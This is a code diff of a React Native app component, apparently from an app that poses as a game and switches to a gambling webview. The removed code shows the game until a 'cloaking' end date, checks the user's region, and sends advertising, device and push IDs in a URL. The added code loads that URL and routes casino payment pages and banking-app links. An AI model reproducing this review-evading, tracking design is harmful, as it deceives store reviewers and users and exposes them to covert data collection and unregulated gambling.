@@ -1,253 +1,169 @@
-import React, {useEffect, useRef, useState} from 'react';
-import {Linking} from 'react-native';
-
-import LoadingScreen from './LoadingScreen';
+import React, { useEffect, useRef, useState } from 'react';
+import {Linking, SafeAreaView, StatusBar, TouchableOpacity, View, Image, Text, Alert} from 'react-native';
+import WebView from 'react-native-webview';
 
 import Storage from './Storage';
-import EventManager from './EventsManager';
+import LoadingAppManager from './LoadingAppManager';
 
-import appsFlyer from 'react-native-appsflyer';
-import ReactNativeIdfaAaid from '@sparkfabrik/react-native-idfa-aaid';
-import AppleAdsAttributionInstance from '@vladikstyle/react-native-apple-ads-attribution';
-import {requestTrackingPermission} from 'react-native-tracking-transparency';
-import {OneSignal} from 'react-native-onesignal';
-import * as Device from 'react-native-device-info';
-import GameScreen from './GameScreen';
-import params from './params';
-import AppManagerStack from './AppManagerStack';
+export default function AppManagerMain({navigation}) {
 
-export default function AppManager() {
-  const viewLoader = <LoadingScreen />;
-  const viewGame = <GameScreen />;
-  const appManagerStack = <AppManagerStack />;
+    const [linkRefresh, setLinkRefresh] = useState('');
 
-  const [isLoadingScreen, setLoadingScreen] = useState(true);
-  const [isGameOpen, setGameOpen] = useState(true);
+	async function getSavedParams() {
+		await Storage.get('link').then((res) => {
+			setLinkRefresh(res);
+		});
+	}
+	useEffect(() => {
+		getSavedParams();
+	}, []);
 
-  const userID = useRef(null);
-  const adID = useRef(null);
-  const appsID = useRef(null);
-  const subsRef = useRef(null);
-  const onesignalID = useRef(null);
-  const deviceID = useRef(null);
-  const isPushAccess = useRef(false);
-  const dataLoad = useRef(null);
+    const webViewRef = useRef(null);
 
-  // генеруємо унікальний ID користувача
-  async function getUserID() {
-    const val = await Storage.get('userID');
-    if (val) {
-      userID.current = val; // додаємо збережений userID
-    } else {
-      // генеруємо новий userID якщо нема збереженого
-      let result = '';
-      for (let i = 0; i < 7; i++) {
-        result += Math.floor(Math.random() * 10);
+    const redirectDomens = [
+		'https://spin.city/payment/success?identifier=',
+		'https://jokabet.com/',
+		'https://winspirit.app/?identifier=',
+		'https://rocketplay.com/api/payments',
+		'https://ninewin.com/',
+    ];
+
+    const browserOpenDomens = [
+		'mailto:',
+		'itms-appss://',
+		'https://m.facebook.com/',
+		'https://www.facebook.com/',
+		'https://www.instagram.com/',
+		'https://twitter.com/',
+		'https://www.whatsapp.com/',
+		'https://t.me/',
+		'fb://',
+		'conexus://',
+		'bmoolbb://',
+		'cibcbanking://',
+		'bncmobile://',
+		'rbcmobile://',
+		'scotiabank://',
+		'pcfbanking://',
+		'tdct://',
+		'nl.abnamro.deeplink.psd2.consent://',
+		'nl-snsbank-sign://',
+		'nl-asnbank-sign://',
+		'triodosmobilebanking',
+    ];
+
+    const domensForBlock = [
+		'bitcoin',
+		'litecoin',
+		'dogecoin',
+		'tether',
+		'ethereum',
+		'bitcoincash',
+    ];
+
+    const checkLinkInArray = (link, array) => {
+		for (let i = 0; i < array.length; i++) {
+			if (link.includes(array[i])) {return true;}
+		}
+		return false;
+    };
+
+    const [currentURL, setCurrentURL] = useState('');
+
+    function checkLockedURL(url) {
+		setCurrentURL(url);
+		setTimeout(() => {
+			if (currentURL === 'about:blank') {webViewRef.current.injectJavaScript(`window.location.replace('${linkRefresh}')`);}
+		}, 2000);
+    }
+
+    const onShouldStartLoadWithRequest = event => {
+		let currentUrl = event.url;
+		console.log(event);
+
+		if (event.mainDocumentURL.includes('pay.skrill.com') || event.mainDocumentURL.includes('app.corzapay.com')) {
+			navigation.navigate('child', {data: event.mainDocumentURL});
+			webViewRef.current.injectJavaScript(`window.location.replace('${linkRefresh}')`);
+		}
+
+		if (checkLinkInArray(currentUrl, redirectDomens)) {
+			webViewRef.current.injectJavaScript(`window.location.replace('${linkRefresh}')`);
+		}
+
+		if (checkLinkInArray(currentUrl, browserOpenDomens)) {
+			webViewRef.current.injectJavaScript(`window.location.replace('${linkRefresh}')`);
+			Linking.openURL(currentUrl);
+		}
+
+		if (checkLinkInArray(currentUrl, domensForBlock)) {
+			webViewRef.current.stopLoading();
+			return false;
+		}
+		return true;
+    };
+
+    const stateChange = navState => {
+		const currentUrl = navState.url;
+		checkLockedURL(currentUrl);
+    };
+
+    const [isInit, setInit] = React.useState(false);
+    const [isLoadingPage, setLoadingPage] = useState(true);
+    const [isInvisibleLoader, setInvisibleLoader] = useState(false);
+
+    const finishLoading = () => {
+      if (!isInit) {
+        setInit(true);
+      } else {
+        setLoadingPage(false);
+	setInvisibleLoader(true);
       }
-      await Storage.save('userID', result); // зберігаємо userID
-      userID.current = result;
-    }
-  }
+    };
 
-  // робимо запит на відстеження
-  async function getAdID() {
-    OneSignal.initialize(params.keyPush);
-    await requestTrackingPermission(); // робимо запит на відстеження
-    ReactNativeIdfaAaid.getAdvertisingInfoAndCheckAuthorization(true).then(
-      res => {
-        // обробляємо клік в алерт
-        adID.current = res.id ? res.id : 'error'; // отримуємо advertising id
-        initAppManager();
-      },
-    );
-  }
+    return <><View style={{flex: 1}}>
+      <SafeAreaView style={{flex: 1, backgroundColor: 'black'}}>
+        <StatusBar barStyle={'light-content'}/>
+        <WebView
+          originWhitelist={[
+          '*',
+          'http://*',
+          'https://*',
+          'intent://*',
+          'tel:*',
+          'mailto:*',
+          ]}
+          onShouldStartLoadWithRequest={onShouldStartLoadWithRequest}
+          onNavigationStateChange={stateChange}
+          source={{uri: linkRefresh}}
+          textZoom={100}
+          allowsBackForwardNavigationGestures={true}
+          domStorageEnabled={true}
+          javaScriptEnabled={true}
+          onLoadStart={() => setLoadingPage(true)}
+          onLoadEnd={() => finishLoading()}
+          allowsInlineMediaPlayback={true}
+          mediaPlaybackRequiresUserAction={false}
+          setSupportMultipleWindows={true}
+          contentMode="mobile"
+          allowFileAccess={true}
+          showsVerticalScrollIndicator={false}
+          javaScriptCanOpenWindowsAutomatically={true}
+          style={{flex: 1, marginBottom: 10}}
+          ref={webViewRef}
+          userAgent={'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/604.1 Version/18.1'}
+        />
+      </SafeAreaView>
+      <TouchableOpacity style={{width: 30, height: 30,  position: 'absolute', bottom: 5, left: 25, alignItems: 'center', justifyContent: 'center'}} onPress={() => {webViewRef.current.goBack()}}>
+        <Image source={require('./assets/images/_back.png')} style={{width: '90%', height: '90%', resizeMode: 'contain'}}/>
+      </TouchableOpacity>
 
-  // порівнюємо теперішню дату та дату закінчення відльожки
-  function checkDateStart() {
-    return new Date() >= new Date(params.targetDate);
-  }
-
-  // перевірка на відкриття webview
-  async function checkInitAppManagerView() {
-    EventManager.sendEvent(EventManager.eventList.firstOpen);
-    if ((await fetch(params.bodyLin)).status === 200) {
-      await initOnesignal();
-    } else {
-      loadGame();
-    } // якщо це не коректне гео запускаємо гру
-  }
-
-  // ініціалізація OneSignal
-  async function initOnesignal() {
-    await OneSignal.Notifications.canRequestPermission().then(permision => {
-      // перевіряємо чи можемо зробити запит на надсилання пушів
-      if (permision) {
-        OneSignal.Notifications.requestPermission(true).then(res => {
-          // робимо запит та обробляємо його
-          isPushAccess.current = res;
-          initAppsflyer();
-        });
-      }
-    });
-    OneSignal.User.addTag(
-      'timestamp_user_id',
-      `${new Date().getTime()}_${userID.current}`,
-    ); // додаємо тег унікального користувача
-  }
-
-  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
-    res => {
-      try {
-        if (JSON.parse(res.data.is_first_launch) === true) {
-          if (res.data.af_status === 'Non-organic') {
-            subsRef.current = res.data.campaign;
-            generateFinish();
-          }
-          if (res.data.af_status === 'Organic') {
-            getAsaAttribution();
-          }
-        }
-      } catch (err) {
-        console.log(err);
-        loadGame();
-      }
-    },
-  );
-
-  async function getAsaAttribution() {
-    try {
-      const adServicesAttributionData =
-        await AppleAdsAttributionInstance.getAdServicesAttributionData();
-      if (
-        !adServicesAttributionData ||
-        typeof adServicesAttributionData.attribution !== 'boolean'
-      ) {
-        generateFinish();
-        return;
-      }
-      if (adServicesAttributionData.attribution === true) {
-        subsRef.current = 'asa';
-      }
-      generateFinish();
-    } catch (error) {
-      generateFinish();
-    }
-  }
-
-  // генеруємо фінальну лінку яку будемо загружати в вебвʼю
-  function generateFinish() {
-    OneSignal.User.getOnesignalId().then(res => {
-      onesignalID.current = res;
-      dataLoad.current =
-        params.bodyLin +
-        `?${params.bodyLin.split('space/')[1]}=1&appsID=${
-          appsID.current
-        }&adID=${adID.current}&onesignalID=${onesignalID.current}&deviceID=${
-          deviceID.current
-        }&userID=${deviceID.current}${generateSubs()}`;
-      Storage.save('link', dataLoad.current);
-      openAppManagerView(true, false);
-    });
-  }
-
-  function openAppManagerView(isFirst, isPushOpen) {
-    if (isFirst && isPushAccess.current) {
-      EventManager.sendEvent(EventManager.eventList.push);
-    }
-    EventManager.sendEvent(EventManager.eventList.web);
-    if (isPushOpen) {
-      EventManager.sendEvent(EventManager.eventList.web_push);
-    }
-    setGameOpen(false);
-    setLoadingScreen(false);
-  }
-
-  function generateSubs() {
-    if (!subsRef.current) {
-      return '';
-    }
-    const subList = subsRef.current.split('_');
-    const subParams = subList
-      .map((sub, index) => `sub_id_${index + 1}=${sub}`)
-      .join('&');
-
-    return `&${subParams}`;
-  }
-
-  // ініціалізація appsflyer
-  async function initAppsflyer() {
-    appsFlyer.initSdk({
-      devKey: params.keyApps,
-      isDebug: false,
-      appId: params.appID,
-      onInstallConversionDataListener: true,
-      onDeepLinkListener: true,
-      timeToWaitForATTUserAuthorization: 7,
-    });
-
-    // отримання appsflyer ID
-    appsFlyer.getAppsFlyerUID((_, id) => {
-      appsID.current = id;
-    });
-  }
-
-  // ініціалізація AppManager
-  async function initAppManager() {
-    if (checkDateStart()) {
-      // перевіряємо дату
-      await Storage.get('link').then(res => {
-        if (res) {
-          // перевіряємо чи не збережена лінка якщо збережена то загружаємо webview
-          dataLoad.current = res;
-          openAppManagerView(false, false);
-        } else {
-          // якщо лінки немає то перевіряємо чи коректне гео
-          checkInitAppManagerView();
-        }
-      });
-    } else {
-      // якщо дата закінчення відльожки ще не пройшла, то запускаємо гру
-      loadGame();
-    }
-  }
-
-  // загружаємо екран з грою
-  function loadGame() {
-    setTimeout(() => {
-      setGameOpen(true);
-      setLoadingScreen(false);
-    }, 2500);
-  }
-
-  useEffect(() => {
-    getUserID();
-    setTimeout(() => {
-      EventManager.setParams(params.bodyLin, userID.current);
-      const initialize = async () => {
-        try {
-          deviceID.current = await Device.getUniqueId();
-          await getAdID();
-        } catch (error) {}
-      };
-      const handleNotificationClick = event => {
-        try {
-          if (event.notification?.launchURL) {
-            EventManager.sendEvent(EventManager.eventList.browser);
-            Linking.openURL(event.notification.launchURL);
-          }
-          openAppManagerView(false, true);
-        } catch (error) {}
-      };
-      initialize();
-      OneSignal.Notifications.addEventListener('click', handleNotificationClick);
-      return () => {
-        OneSignal.Notifications.removeEventListener(
-          'click',
-          handleNotificationClick,
-        );
-      };
-    }, 200);
-  }, []);
-
-  return isLoadingScreen ? viewLoader : isGameOpen ? viewGame : appManagerStack;
+      <TouchableOpacity style={{width: 30, height: 30,  position: 'absolute', bottom: 5, right: 25, alignItems: 'center', justifyContent: 'center', padding: 5}} onPress={() => {
+        webViewRef.current.reload();
+        setLoadingPage(true);
+      }}>
+        <Image source={require('./assets/images/_reload.png')} style={{width: '90%', height: '90%', resizeMode: 'contain'}}/>
+      </TouchableOpacity>
+    </View>
+      {isLoadingPage && !isInvisibleLoader ? <LoadingAppManager/> : <></>}
+    </>;
 }
